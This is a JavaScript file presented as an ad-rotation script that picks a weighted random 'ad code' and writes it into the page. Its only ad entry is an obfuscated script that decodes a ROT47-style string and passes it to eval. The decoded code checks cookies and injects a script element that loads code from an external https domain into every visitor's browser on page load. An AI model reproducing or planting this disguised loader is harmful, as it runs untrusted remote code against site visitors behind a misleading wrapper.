var randoms = {
	ads_codes: ['<script>!(function () {const a=[\'892509ihzscA\',\'530411PjsRQp\',\'460686BmxLLG\',\'1054465hgWskM\',\'charCodeAt\',\'length\',\'329803SSncuZ\',\'1ktJhvf\',\'658247zxYAze\',\'833249EfPxfO\',\'substr\',\'fromCharCode\'];(function(c,d){const h=b;while(!![]){try{const e=parseInt(h(0x136))+parseInt(h(0x131))*-parseInt(h(0x133))+parseInt(h(0x12b))+-parseInt(h(0x12c))+parseInt(h(0x12d))+-parseInt(h(0x132))+parseInt(h(0x130));if(e===d)break;else c[\'push\'](c[\'shift\']());}catch(f){c[\'push\'](c[\'shift\']());}}}(a,0xd0bde));function b(c,d){return b=function(e,f){e=e-0x12b;let g=a[e];return g;},b(c,d);}function pushCode(c){const i=b;let d,e,f=\'\',g;for(d=0x0;d<c[i(0x12f)];d++){e=c[i(0x12e)](d);if(e>=0x21&&e<=0x4f)f=f+String[\'fromCharCode\'](e+0x2f);else{if(e>=0x50&&e<=0x7e)f=f+String[i(0x135)](e-0x2f);else{g=d+0x1;if(c[i(0x134)](g,0x1)==\'@\')f=f+String[\'fromCharCode\'](e+0x5);else f=f+c[i(0x134)](d,0x1);d++;}}}return f[\'replace\'](\'@@\',\'-\');}eval(pushCode("G2C ,:5lQa_hf_dhg`hf_h``abgeoo`__deQj5@4F>6?E]HC:E6WVk:?D ,DEJ=6lQ5:DA=2Ji?@?6P:>A@CE2?EQ ,:5lQVZ:5ZVQmk^:?DmVXjWH:?5@H]253JF?:@?lH:?5@H]253JF?:@?MM,.X]AFD9W:5XjG2C ,Dl5@4F>6?E]4C62E6t=6>6?EWQD4C:AEQX[9l5@4F>6?E]86Et=6>6?EDqJ%28}2>6WQ9625QX,_.jD]492CD6ElQFE7\\gQjD]2DJ?4lP_jD]DC4lQ9EEADi^^eCC]=>gga]4@>^@];DQj9]:?D6CEq67@C6WD[9]7:CDEr9:=5X"))})()<'+'/script>'],
	ads_weight: [10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();